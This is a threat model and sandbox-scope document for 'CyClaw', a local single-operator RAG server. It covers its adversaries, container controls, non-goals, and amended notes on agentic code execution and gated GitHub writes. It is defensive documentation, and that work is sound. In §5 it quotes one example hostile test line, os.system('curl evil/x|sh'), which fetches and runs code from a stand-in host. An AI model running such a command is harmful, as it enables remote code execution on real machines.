---
title: "CyClaw Threat Model & Sandbox Scope"
date: 2026-06-26
tags: [security, threat-model, sandbox, hardening, scope]
related:
  - .github/SECURITY.md
  - docs/audits/SECURITY_REVIEW_STATUS.md
  - docs/SECCOMP_EBPF_HARDENING.md
  - deploy/falco/README.md
---

# CyClaw Threat Model & Sandbox Scope

This document states plainly **what CyClaw's "sandbox" does and does not protect
against**, so the security posture is neither under-built nor over-sold. It
consolidates the threat-model assumptions previously scattered across
`CLAUDE.md`, `.claude/rules/PROJECT_RULES.md`, `.github/SECURITY.md`,
`config.yaml`, and code comments.

> 💡 **One-line stance:** CyClaw is a **single-operator, loopback-bound, local
> RAG server**. Its layered controls are strong *for that deployment*. It is
> **not** a multi-tenant platform for executing untrusted code, and does not
> claim microVM/hypervisor-grade isolation.

---

## 1. System assumptions (the deployment we secure for)

| Assumption | Value |
|---|---|
| Network exposure | Host exposure is **exclusively** `127.0.0.1:8787` — never a non-loopback host interface. Bare-metal runs bind loopback directly; the container deployment publishes only to host loopback (`127.0.0.1:8787:8787`) while uvicorn binds the container-private network namespace (`0.0.0.0` inside the container) so the publish can reach it. |
| Operators | **Single trusted operator** (or a small trusted home-lab/LAN). |
| Tenancy | **Single-tenant.** No mutual isolation between users is attempted. |
| Data store | Embedded ChromaDB (`PersistentClient`) + local BM25 + SQLite. No HTTP DB. |
| LLM | Local Ollama over loopback; optional Grok and/or Claude fallback (triple-gated per provider, off by default). |
| Outbound model egress | **Two planes, both off by default.** The core graph's triple-gated fallback (`mode==hybrid` AND `<provider>.enabled` AND `user_confirmed_online`), and the out-of-band Deep Agents harness behind a six-condition chain: `agentic.enabled`, `deepagent_github.enabled`, `allow_cloud_providers`, `providers.<name>.enabled`, the provider's API-key env var present, and a per-run `--confirm-online`. Destinations are `api.x.ai` and `api.anthropic.com` only. `agentic/deepagent_github/handoff.py` implements a `HandoffEnvelope`/`sanitize_handoff` to record egress this way — a SHA-256 of the outbound prompt, its length, the context doc ids, and a redaction count, never the prompt text. **This chain now has two consumers, not one, with different egress-recording states (see §5's fifth amendment):** `agentic/cli.py`'s `real-repo-run --provider`, wired to `agentic.deepagent_github.chat_client.ChatModelProposerClient`, calls `sanitize_handoff` on every real invocation — egress IS recorded there. The separate, still-unwired `builder.py`/DeepAgents-graph path (`deepagent-plan`, probe-only) passes its constructed cloud `BaseChatModel` straight to the DeepAgents `creator(model=model, ...)` call with no wrapping through `sanitize_handoff`; that path's egress is NOT recorded, and remains out-of-scope follow-on work. |
| Agentic / sync layers | **Out-of-band, opt-in, disabled by default.** Never imported by `gate.py`/`graph.py`/`mcp_hybrid_server.py`. |
| Host | A machine the operator controls. Host root is **trusted**. |

If you deploy outside these assumptions (internet-facing, multi-tenant, running
untrusted third-party skills), **re-evaluate** — several controls below are scoped
to the single-operator model and are not sufficient on their own for hostile
multi-tenant workloads.

---

## 2. In-scope adversaries & the control that answers each

| Threat | Primary control | Where |
|---|---|---|
| **Prompt injection** (direct) | 40-pattern sanitizer at `/query` and at index time | `utils/sanitizer.py`, `config.yaml` |
| **Indirect / RAG injection** (poisoned retrieved doc) | Retrieved context tagged untrusted in-prompt; topology never lets a doc redirect routing | `graph.py` (`UNTRUSTED_NOTE`, topology=policy) |
| **Corpus / memory poisoning** | Injection scan on ingestion; chunk sanitization | `retrieval/indexer.py`, `utils/sanitizer.py` |
| **Soul poisoning** (persisted identity hijack) | Soul writes require human `reason`; injection gate enforced at the write boundary; atomic `os.replace`; SHA-256 drift detection | `utils/personality.py`, `gate.py` |
| **Unauthorized soul mutation** | Fail-closed Bearer auth on all `/soul/*`; constant-time key compare | `gate.py` |
| **DNS-rebinding → state-changing POST** | `TrustedHostMiddleware` Host allow-list (outermost middleware) | `gate.py`, `config.yaml` |
| **Unauthorized cross-origin reads** | CORS allow-list | `gate.py`, `config.yaml` |
| **Uncontrolled external model calls** | Triple-gate: `mode=hybrid` **and** the selected provider's `grok.enabled`/`claude.enabled` **and** `user_confirmed_online` | `graph.py`, `config.yaml` |
| **Telemetry / data exfil via tracing** | Telemetry-kill env vars set before any import, by **every** entry point (gateway, MCP server, indexer CLI) from one shared mapping — an ambient value in the operator's environment is overwritten, not inherited; HF Hub network calls are additionally cut off via `local_files_only=True` once the embedding model is confirmed cached on disk (the `HF_HUB_OFFLINE`/`TRANSFORMERS_OFFLINE` env vars alone do not gate this in-process — huggingface_hub latches that constant at its own import time, which the eligibility probe itself triggers before the env vars are set; `local_files_only` is passed directly to `SentenceTransformer(...)` instead, which gates independently); raw query text never persisted (hashes only) | `utils/telemetry_kill.py`, `gate.py`, `mcp_hybrid_server.py`, `retrieval/vector_store.py`, `retrieval/embeddings.py`, `utils/logger.py` |
| **DoS (request flood / runaway process)** | Per-IP rate limit (60/min); container `mem`/`pids`/`cpus` limits | `utils/ratelimit.py`, `docker-compose.yml` |
| **Compromised out-of-band subprocess** (rclone/gh) | argv-list only (no `shell=True`); absolute binary paths; seccomp profile; non-root; `no-new-privileges`; `cap_drop: ALL`; read-only rootfs | `sync/`, `agentic/`, `Dockerfile`, `docker-compose.yml`, `deploy/seccomp/` |

---

## 3. What the sandbox layers DO cover

Container/OS-level controls currently enforced (see `Dockerfile` +
`docker-compose.yml`):

- **Loopback-only** publish (`127.0.0.1:8787`).
- **Non-root** runtime user (`uid:gid 1000:1000`), multi-stage minimal image.
- **`no-new-privileges:true`** — no setuid privilege escalation in-container.
- **`cap_drop: ALL`** — zero Linux capabilities.
- **Read-only root filesystem** with explicit writable carve-outs
  (`data`/`index`/`logs`/`checkpoints`/`.emb_cache` + `tmpfs:/tmp`).
- **seccomp profile** applied (`deploy/seccomp/sync-rclone.json`) — blocks
  `mount`, `ptrace`, `reboot`, etc.
- **Resource ceilings** (`mem_limit`, `pids_limit`, `cpus`).
- **Optional eBPF detection** (Falco, `deploy/falco/`) — disabled by default;
  logs anomalous exec/write/egress on the agentic & sync paths.

Application/architectural controls (the primary boundary — enforced by graph
topology, not prompts): the **five security invariants** (RAG-first,
topology=policy, triple-gated external, audit convergence, soul governance) and
**module isolation** (out-of-band layers never imported by core paths). See
`CLAUDE.md` and `.claude/rules/PROJECT_RULES.md`.

---

## 4. What the sandbox layers DO **not** cover (explicit non-goals)

> ⚠️ Do not rely on CyClaw for any of the following without additional, external
> controls. These are out of scope **by design** for the single-operator model.

- **Untrusted multi-tenant code execution.** CyClaw is not a platform for running
  arbitrary user-supplied code. `agentic/executor/` (added after this document's
  original write-up; see §5's dated note) can run `pytest`/`ruff`/the invariant
  guard as subprocesses over a worktree — that is real code execution, and this
  bullet no longer claims the agentic layer executes nothing. What it still
  claims, and what remains true: this is not multi-tenant, and it is not a
  platform for arbitrary *third-party* code — see §5 for the distinction and its
  limits.
- **A hard network boundary around the verification executor.** `agentic/executor`'s
  environment scrub (dropping proxy variables and API keys, setting
  `PIP_NO_INDEX`) is a best-effort software control, not a network namespace or
  firewall. It stops the common case — an HTTP-library-based request, or an
  accidental secret-env leak into a check's output — and does **not** stop a
  raw socket connection, which never consults `HTTPS_PROXY`. Treat any claim
  that a verified worktree "had no network access" as unverified until a real
  namespace/firewall control exists (§6, stage 5).
- **Kernel / hypervisor escape.** There is **no microVM** (gVisor/Firecracker).
  Container isolation shares the host kernel. A kernel-level escape is not
  contained. This is acceptable *only* because the workload is not untrusted code.
- **Hostile local root.** The host operator is trusted. CyClaw does not defend
  against a malicious root on the same machine.
- **Internet-facing / public multi-user deployment.** The loopback bind, CORS,
  and Host allow-list assume a trusted local caller. Exposing the port publicly
  voids the threat model.
- **Strong syscall *blocking* on the gate process.** The current seccomp profile
  permits the broad set the rclone/agentic subprocesses need. A tight,
  gate-specific block-list is **roadmap**, not present (see §6).
- **Confidentiality against a compromised Ollama / Grok / Claude endpoint.** Prompt and
  retrieved context are sent to the configured model; trust in that endpoint is
  assumed.
- **Provider-side retention of anything sent to Grok or Claude.** Once bytes reach
  a provider, retention and processing are governed by that provider's agreement,
  not by CyClaw. This is why every egress path ends in a per-use human confirmation.

---

## 5. Why microVM isolation is **not** required here

A 2026 review may reflexively call for gVisor/Firecracker microVMs around
"agentic code that can touch fs/sql." For CyClaw that recommendation targets a
threat that the architecture has already removed:

- **GitHub writes are implemented but disarmed** (amended by P10 — see the
  fourth amendment in §5). `agentic/writer.py` ships `EXECUTION_ENABLED = False`,
  and `execute_write()` refuses on that flag before anything else. It is no
  longer `NotImplementedError` behind the flag: the `pr_create` path is
  implemented. What holds the line on a shipped checkout is the flag plus three
  independent `config.yaml` gates (`agentic.enabled`, `agentic.mode`,
  `agentic.writes_enabled`), all failing closed, and `execute_write()` re-runs
  the full gate on every call rather than trusting the plan it is handed.
- **SQL is read-only-guarded.** `agentic/sqlconnect/client.py` rejects every
  non-`SELECT` statement (and comments, and multi-statements) before execution.
- **Filesystem writes are triple-gated and off by default.** `writes_enabled`
  defaults `False`; writes additionally require a non-empty `reason` and `confirm`,
  and are confined to an allow-list of writable roots via zero-TOCTOU path checks.
- **Local governed writes exist and are not the same thing as GitHub writes.**
  Two agentic write paths are shipped, working, and default-off:
  `agentic/fsconnect/writer.py` (the filesystem writer above, which carries its
  own `FS_WRITE_HARD_DISABLE` module constant alongside the config gates) and
  `agentic/harness_optimizer/patching.py::apply_candidate_artifact`, which
  writes a SHA-256-versioned JSON record under `data/agentic/harness_optimizer/`
  after eight sequential gates including an independent injection re-check. Read
  "GitHub writes are hard-killed" above as scoped to GitHub — not as "the
  agentic layer never writes anything."
- **The skills registry never auto-writes.** `propose_skill` is advisory-only;
  `apply_skill` enforces the injection gate + `reason` and writes atomically to a
  single confined JSON path. All registry operations (`propose-skill` /
  `apply-skill`) are additionally gated on the `agentic.enabled` master switch:
  when the layer is disabled they no-op, so a registry write can never occur while
  the operator believes the layer is off (including via the API-key-gated
  `POST /ops/agentic` console).
- **No `shell=True` anywhere.** Every subprocess uses argv-list form with an
  absolute/fixed binary path.
- **Core paths exec nothing.** `gate.py`/`graph.py`/`mcp_hybrid_server.py` spawn
  no subprocesses and never import the agentic/sync layers.

The residual blast radius, as originally written here, was a governed,
injection-scanned JSON registry write and read-only GitHub/SQL access — **not**
untrusted code execution.

**[Amendment, added alongside `agentic/executor/`.]** That last clause needs a
correction, stated as plainly as the rest of this section: **code execution now
exists.** `agentic/executor/runner.py::run_verification` runs `pytest`, `ruff`,
and the invariant guard as real subprocesses over a worktree. This section's
own conclusion — that microVM containment isn't needed — still holds, but for a
narrower and more precise reason than "nothing executes":

- **The code is not untrusted third-party code.** It is either nothing yet (as
  of this amendment, no live caller produces a worktree with a model-authored
  diff in it — see the module's own docstring for exactly what's wired and what
  isn't; **superseded by the third amendment below, where that caller now
  exists**), or, once a future phase wires a real planner and git-write flow, a
  patch the operator's own configured model proposed against the operator's own
  repository, already passed through the injection scan (§2), running through
  the operator's own pinned dev toolchain (`pytest`/`ruff`/the invariant guard —
  not an arbitrary command the patch gets to choose). This is a materially
  different threat than "run whatever an anonymous multi-tenant user uploads,"
  which is the threat gVisor/Firecracker actually target.

  **[Second amendment, added alongside the loop driver and git-write surface.]**
  Two of the three pieces that sentence called "future phase" now exist, each
  independently, and neither changes the conclusion above:

  - **A model-driven planner loop** (`agentic/harness_optimizer/loop_driver.py`)
    runs a plan → patch → verify → review cycle, but "verify" there means the
    existing deterministic train/holdout case checks and governance inspection
    `GitHubCodingRunner.evaluate()` already performed pre-amendment — it never
    calls `run_verification`, and it only ever overlays a candidate onto the
    committed 4-file fixture repository copied into a tempdir, never a real
    clone. It cannot produce a worktree for the executor to run against.
  - **A local git-write surface** (`agentic.deepagent_github.repo_workspace.
    RepoWorkspaceTools.checkout_branch`/`add`/`commit`/`diff`) can now commit
    inside the jailed clone `RepoWorkspaceTools.clone()` populates — still
    local only (no `push`, no GitHub API call), gated on its own
    default-`False` `deepagent_github.allow_git_write_tools` flag, and with
    the committer identity always forced to this project's own convention
    (never the operator's).

  Neither module calls the other, and neither calls `run_verification`. The
  loop driver never sees a real repository; the git-write surface never runs a
  test or a linter. So the residual risk section above still describes the
  honest state precisely: a real "planner proposes a diff against a real clone,
  it gets committed, and the executor verifies that commit" pipeline does not
  exist yet — three independently-shipped, independently-tested, independently
  gated pieces do, each smaller than the pipeline the first amendment
  described, and none of them wired to either of the others.
  **Superseded by the third amendment below: that pipeline now exists, and
  the loop driver referenced here is a distinct, still-unwired module — see
  its own entry for what remains unconnected.**

  **[Third amendment: that pipeline now exists.]** `agentic/real_repo_loop.py::
  run_real_repo_loop` is the fusion the second amendment said didn't exist yet,
  and the first live caller of `run_verification` in this codebase. What it
  actually does, precisely: clone a real repository (`RepoWorkspaceTools`),
  ask the configured local model for a patch, write each proposed file through
  `RepoWorkspaceTools.write_file` (new in this change — the write-side
  counterpart to its existing reads, same path-safety validation as the git
  ops), and run the CALLER'S declared verification checks against the real
  worktree. It stops there — accepting a candidate does NOT commit it.
  Committing is a deliberate, separate later call, `finalize_real_repo_change`,
  driven by an explicit human `approve`/`reject` decision (a `reject` never
  touches git at all). Still local only: no `push`, no PR, no GitHub API call,
  regardless of the decision. `RepoWorkspaceTools.attach` exists so that
  decision can come from a LATER, separate process re-opening the same clone
  by path — the CLI-subprocess-per-call model I6 requires (see
  `utils/ops_runner.py`) can't hold a live Python object across two HTTP
  requests, so the clone's path on disk, not an in-memory handle, is what
  survives between "this passed its checks" and "a human said yes."

  What is gated, and how, stated exactly rather than "it's gated":

  - Three conditions checked once at the top of the run, mirroring
    `agentic/writer.py`'s own "no anonymous mutations" shape:
    `deepagent_github.allow_git_write_tools` is `True`, a non-empty human
    `reason` string, and explicit `confirm=True`. Each of `write_file`/`add`/
    `commit` ALSO re-checks `allow_git_write_tools` independently — the
    upfront check exists to fail fast (before spending a model call and a
    verification run), not to replace the low-level ones.
  - Every proposed file's content is injection-scanned
    (`inspect_candidate_text`) before verification runs; a critical finding
    skips verification entirely (no point running tests against known-bad
    content) and forces rejection.
  - Verification `checks` are a REQUIRED caller argument, never defaulted —
    `agentic.executor.default_checks()` assumes this repository's own
    toolchain (a CyClaw-specific invariant-guard path) and would be a wrong,
    invented assumption for an arbitrary configured target. An empty check
    list is rejected outright rather than silently accepting everything.
  - The git commit message is always a caller-supplied fixed string, never
    raw model output — the one place in this pipeline that deliberately does
    NOT trust the planner's own words.

  **The residual risk is real, and is exactly the executor's own risk,
  inherited unchanged.** `run_verification`'s environment scrub is still a
  soft, software-only control (§4's bullet above); it does not become a
  hard sandbox by having a real caller. A verification check that itself
  executes attacker-shaped code (a hostile test file the model proposed, that
  the caller's own declared checks happen to run) carries the same residual
  as before — jailed worktree, scrubbed env, wall-clock timeout, no inherited
  secrets, no raw-socket defense. An operator should read "accepted" as "the
  checks I named passed against this patch," not as "this patch is safe" —
  the human `reason` and `confirm` gates exist so that reading is a deliberate
  choice, not an assumption baked into the tooling.

  **What still does not exist, as of this amendment:** no CLI subcommand, HTTP
  route, or background caller invokes `run_real_repo_loop` — it ships fully
  tested and standalone, the same deferred-wiring call made for every prior
  capability in this effort. No cloud-provider planner is wired here either
  (still local-only, `LocalProposerClient`). Those remain explicit future
  work, not silently implied to already exist.
  **Superseded by the fifth amendment below: both now exist.**

  **Two correctness gaps an external review caught, both fixed.** First: the
  planner received only the operator's free-text instruction and prior
  rejection feedback — never the repository content or task context. A
  `--pr`/`--issue` run's already-fetched, already-injection-scanned title,
  body, and diff were discarded before the model call, so the planner had to
  guess complete replacement files blind. `run_real_repo_loop` now accepts an
  optional, bounded `context` string folded into every iteration's prompt;
  `agentic/cli.py::cmd_real_repo_run` supplies it from the fetched bundle when
  one exists. This is plumbing, not a new read surface: the planner still
  cannot browse the clone or request specific files mid-loop. Second: because
  `write_file` mutates the same persistent clone across iterations (there is
  no reset between attempts — `feedback` is meant to build ON the prior
  attempt, not replace it), a rejected early iteration's file could remain on
  disk and be required for a LATER, accepted iteration's checks to pass, while
  only that later iteration's own file list was staged for commit. A `checks`
  configuration that depended on an earlier file could pass verification
  while the approved commit silently omitted it.
  `RealRepoLoopResult.changed_files` now unions every iteration's writes, and
  `cmd_real_repo_run`/`finalize_real_repo_change` use that union rather than
  the last iteration's own list.
- **The residual risk this changes is real and is named, not hidden.** A
  hostile test file (e.g. one line reading `os.system("curl evil/x|sh")`)
  genuinely can attempt to run arbitrary code within the executor subprocess's
  own privileges. The compensating controls are: a jailed worktree (nothing
  outside it is reachable through the checks themselves), a scrubbed,
  network-hostile environment (soft, not hard — see §4's new bullet above), a
  hard per-check wall-clock timeout, `check=False` so a non-zero exit is data
  rather than an exception, and no inherited secrets (API keys are not in the
  allowlisted environment). None of these is a kernel-level boundary.
- **What this does NOT change:** GitHub writes remain unreachable on a shipped
  checkout (see the fourth amendment below, which supersedes the phrase
  "hard-killed" without changing the shipped posture), SQL is still
  read-only-guarded, and filesystem writes are still triple-gated. The executor
  itself never chooses WHAT to run — the argv is fixed, non-attacker-chosen,
  operator- or config-supplied — but correcting an earlier overclaim: it does
  not follow that nothing it runs can write. Its `cwd` is the same worktree
  `run_real_repo_loop` just wrote model-authored content into, so the shipped
  default check (`pytest`) can and does write there in the ordinary course of
  test collection and execution — a hostile `conftest.py` reaching disk is
  exactly the residual risk named in the bullet above, not a separate one.

### Fourth amendment — the GitHub write path is implemented (P10)

- **What changed.** `execute_write()` was a stub that raised
  `NotImplementedError`. It now performs `gh pr create --draft` for real, and
  `RepoWorkspaceTools.push_branch()` can push one `claude/` branch to origin.
  The sentence "GitHub writes are hard-killed" was true of the code and is no
  longer; the §5 bullet above has been rewritten rather than left standing.
- **What did NOT change: the shipped posture.** `EXECUTION_ENABLED` is still
  `False`, and `agentic.enabled` / `agentic.mode` / `agentic.writes_enabled`
  still ship closed. Six independent gates, any one of which refuses (see
  `docs/agentic/GITHUB_WRITE_ENABLEMENT.md`'s gate-chain table). P10
  deliberately did not flip the flag — arming it is a filed-checklist operator
  procedure, matching how the analogous fsconnect write enablement was handled.
- **What is gated, exactly.** `execute_write()` checks `agentic.enabled` first
  -- an external review caught that this master switch was, until then,
  enforced only by the CLI's own disabled-no-op, not by `_require_gates()`
  itself, so a direct programmatic call could bypass it. `execute_write()` then
  requires a FRESH `confirm=True` from its own caller: an earlier version
  manufactured `confirm=True` internally when re-running the gate, which made
  that gate unconditionally satisfied rather than a real per-call check -- the
  same review caught this too. With both fixed, `execute_write()` re-runs the
  master switch plus all four numbered gates against the live config on every
  call, so possessing a plan dict is not authority to write. It rebuilds the
  argv from the plan's own params and refuses on mismatch, so a tampered
  `would_run` is inert. It refuses a plan naming a repo other than the
  configured one. It refuses any op outside `{pr_create}` even though three
  are describable. It never retries: both of `run_read`'s retry branches fire
  after the request has left the machine, so a retry could duplicate an
  accepted mutation; a timeout is reported as INDETERMINATE.
- **The residual risk, named.** With the flag armed and the config gates opened,
  this code can push a `claude/*` branch and open a draft PR against the
  configured repo as the authenticated `gh` identity. It cannot push to `main`,
  force-push, or delete. Two honest gaps: `push_branch` inherits the operator's
  ambient git credential helper (CyClaw passes no token of its own, deliberately
  — the environment it would live in is shared with the executor that runs
  model-proposed commands), and `agentic/executor`'s operator-supplied check
  argv can already run `git push` inside the clone, bypassing the `claude/*`
  scoping. The second is pre-existing, operator-supplied rather than
  model-supplied, and is called out as item H of the enablement checklist.
- **What still does not exist:** `pr_comment` and `issue_comment` execution,
  and any `/ops/*` route reaching a write. **Superseded in part by the sixth
  amendment below:** the other three items this bullet used to claim — a
  harness route reaching a write, a CLI write subcommand, and wiring into the
  real-repo loop's approve step — all now exist, and a GitHub mutation is
  network-triggerable once the flag is flipped. Only the `pr_comment`/
  `issue_comment` and `/ops/*` clauses still hold.

MicroVM containment would still add operational weight and privileged host
requirements most single-operator deployments of CyClaw cannot assume. It
remains the honest next step (§6, stage 5) if the threat model ever widens
beyond "verify a change to my own configured repo" — e.g., if this executor
were ever pointed at a repo, or dev-toolchain command, the operator did not
themselves configure. Until that widening happens, stage 5 stays conditional,
not because nothing executes, but because what executes is scoped, known, and
not attacker-chosen at the command level.

### Fifth amendment — `run_real_repo_loop` now has real callers, including one with a cloud-provider planner

- **What changed.** The third amendment's "what still does not exist" bullet
  is stale: `agentic/cli.py`'s `real-repo-run` subcommand calls
  `run_real_repo_loop` directly, and `harness/server.py`'s `POST
  /api/agent/run` reaches the same loop through the `utils.ops_runner`
  subprocess shim — a real CLI subcommand and a real HTTP route both exist
  now, not merely a tested-but-standalone module.
- **The HTTP route is not a new unauthenticated surface.** It is one of the
  harness's P9 routes: `require_api_key` (fail-closed on an unset
  `CYCLAW_API_KEY`) plus an `Origin`/`Sec-Fetch-Site` same-origin check guard
  it, alongside the paired `GET /api/agent/runs/{id}` status read and `POST
  /api/agent/runs/{id}/decision` human approve/reject endpoint — the same
  decision point `real-repo-run-decide` already required at the CLI layer.
- **A cloud-provider planner is wired, and unlike the DeepAgents-graph path
  the egress table row above describes, this one records egress.**
  `agentic/cli.py`'s `--provider {grok,claude}` flag (paired with
  `--confirm-online`) constructs `agentic.deepagent_github.chat_client.
  ChatModelProposerClient` behind the same six-condition chain named in the
  egress table row (`allow_cloud_providers`, `providers.<name>.enabled`, the
  provider's API key, `--confirm-online`), gates checked eagerly before any
  network I/O. `ChatModelProposerClient.invoke` calls `sanitize_handoff` on
  every real invocation before the model call — the egress table row's
  caveat ("not recorded as egress") describes ONLY the separate, still-unwired
  `builder.py`/`create_deep_agent` path; it was never true of this path and
  should not be read as a blanket statement about all cloud egress in the
  agentic layer.
- **What still does not exist.** The `builder.py`/DeepAgents-graph path
  (`create_deep_agent`) remains probe-only — `agentic/cli.py`'s
  `deepagent-plan` subcommand deliberately never calls `.invoke()` on it, by
  its own docstring. **Retired (owner decision, 2026-07-31): no further
  development is planned on this path** — `run_real_repo_loop` is the one
  live real-repo coding pipeline going forward; see
  `docs/agentic/GITHUB_DEEP_AGENT_HARNESS_OPTIMIZER_PLAN.md`'s own
  retirement note.

### Sixth amendment — the write path is now network-reachable (still disarmed)

- **What changed.** The fifth amendment above said `push_branch`/`execute_write`
  were "still not forwarded through any harness HTTP route, which only passes
  `decision` today." That was true when written and is no longer. Both are now
  reachable three ways: `agentic.cli`'s `real-repo-run-decide --push/--publish`
  (one-shot), the standalone `real-repo-run-push`/`real-repo-run-publish`
  subcommands, and — the material change — `POST /api/agent/runs/{id}/push`
  and `POST /api/agent/runs/{id}/publish` on the harness. A third route,
  `POST .../discard`, reclaims a clone and reaches no write.
- **So "GitHub writes are un-triggerable over the network" is retired as a
  claim.** Once `EXECUTION_ENABLED` is flipped, an authenticated, same-origin
  caller on loopback can open a draft PR against an approved-and-pushed run.
  What still bounds it: `CYCLAW_API_KEY` (fail-closed) plus an
  `Origin`/`Sec-Fetch-Site` check on every one of those routes, the run-state
  guards (`require_approved_for_push`, `require_pushed_for_publish`), and the
  six write gates themselves. The per-invocation blast radius is unchanged —
  one `claude/*` branch, one draft PR, no force-push, no delete.
- **What did NOT change: the shipped posture.** `EXECUTION_ENABLED` is still a
  hardcoded `False` that no config file can flip, and
  `allow_git_write_tools`/`agentic.enabled`/`mode`/`writes_enabled` all still
  ship closed. Nothing here arms anything.
- **This is the checklist's own trigger, and it fired.**
  `docs/agentic/GITHUB_WRITE_ENABLEMENT.md` item A said that if reachability
  ever changed the checklist was void and had to be re-run. It was re-run on
  2026-07-31; that document, not this one, is authoritative on the gate chain
  and carries the open operator decisions.

---

## 6. Hardening maturity ladder

| Stage | Control | Status |
|---|---|---|
| 0 | Loopback bind, non-root, telemetry-kill, injection filter, topology invariants | ✅ Done |
| 1 | `no-new-privileges`, `cap_drop: ALL`, read-only rootfs, resource limits, seccomp on rclone/agentic path | ✅ Done |
| 2 | eBPF **detection** (Falco) over agentic/sync/gate, disabled-by-default | ✅ Scaffold shipped (`deploy/falco/`) |
| 3 | eBPF-**profiled**, tight gate-specific seccomp block-list (replace the broad profile) | 🔜 Roadmap — needs syscall traces first |
| 4 | Landlock / AppArmor profiles for filesystem confinement | 🔜 Roadmap |
| 5 | gVisor / Firecracker microVM around any future *untrusted-workload* mode | ⏸ Conditional — only if the untrusted-exec threat appears |

Stage 3 deliberately depends on Stage 2: the minimal `deploy/seccomp/gate-seccomp.json`
floor (16 syscalls) cannot boot `uvicorn`+`torch`+`chromadb`, so a correct
gate-specific profile must be *generated from real eBPF traces*, not hand-guessed.
Until then the gate runs under the broader, working profile.

---

## 7. Reporting

Security issues: follow [`.github/SECURITY.md`](../.github/SECURITY.md). Resolved
findings and their status live in
[`docs/audits/SECURITY_REVIEW_STATUS.md`](./audits/SECURITY_REVIEW_STATUS.md).
